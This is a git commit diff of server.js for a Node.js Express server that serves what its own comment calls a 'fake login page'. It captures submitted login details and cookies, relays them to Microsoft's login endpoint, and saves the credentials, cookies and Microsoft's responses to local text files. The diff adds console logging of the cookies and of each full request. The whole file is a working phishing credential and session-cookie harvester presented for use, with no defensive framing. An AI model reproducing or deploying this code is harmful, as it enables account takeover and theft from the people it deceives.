3026fae250d56bcaa52f6a173f32651fb926557c
Rex <akpoyibofortune@gmail.com>
2025-01-09 23:36:47 +0100

    Add files via upload

--- server.js
+++ server.js
@@ -1,30 +1,40 @@
-const express = require('express');
-const path = require('path');
+const express = require("express");
+const path = require("path");
 const app = express();
-const axios = require('axios');
-const fs = require('fs');
+const axios = require("axios");
+const fs = require("fs");
 
 // Serve index.html when the root URL is accessed
-app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'myfile.html')); // Send the fake login page
+app.get("/", (req, res) => {
+  res.sendFile(path.join(__dirname, "myfile.html")); // Send the fake login page
+  console.log("cookies: ", req.headers.cookie);
+  console.log("req: ", req);
 });
 
 // Capture form submissions from index.html
-app.post('/login', (req, res) => {
-    let submittingData = `Login Details: ${JSON.stringify(req.body)}`;
-    let submittingCokies = `Cookies: ${req.headers.cookie}`;
-    
+app.post("/login", (req, res) => {
+  let submittingData = `Login Details: ${JSON.stringify(req.body)}`;
+  let submittingCokies = `Cookies: ${req.headers.cookie}`;
 
-    // Forward data to Microsoft's server
-    axios.post('https://login.microsoftonline.com/common/login', req.body, {
-        headers: { 'Cookie': req.headers.cookie },
+  console.log({ submittingData, submittingCokies });
+
+  // Forward data to Microsoft's server
+  axios
+    .post("https://login.microsoftonline.com/common/login", req.body, {
+      headers: { Cookie: req.headers.cookie },
     })
-    .then(response => {
-        const respon = 'Microsoft Response:'  + JSON.stringify(response.data);
-        fs.appendFileSync(`${submittingData.substring(0, 15)}.txt`, submittingData + '\n' + submittingCokies +  '\n' + respon );
-        res.send(response.data); // Send Microsoft's response back to the user
+    .then((response) => {
+      const respon = "Microsoft Response:" + JSON.stringify(response.data);
+
+      console.log({ respon });
+
+      fs.appendFileSync(
+        `${submittingData.substring(0, 15)}.txt`,
+        submittingData + "\n" + submittingCokies + "\n" + respon
+      );
+      res.send(response.data); // Send Microsoft's response back to the user
     })
-    .catch(err => res.status(500).send('Error'));
+    .catch((err) => res.status(500).send("Error"));
 });
 
 const PORT = process.env.PORT || 3000;
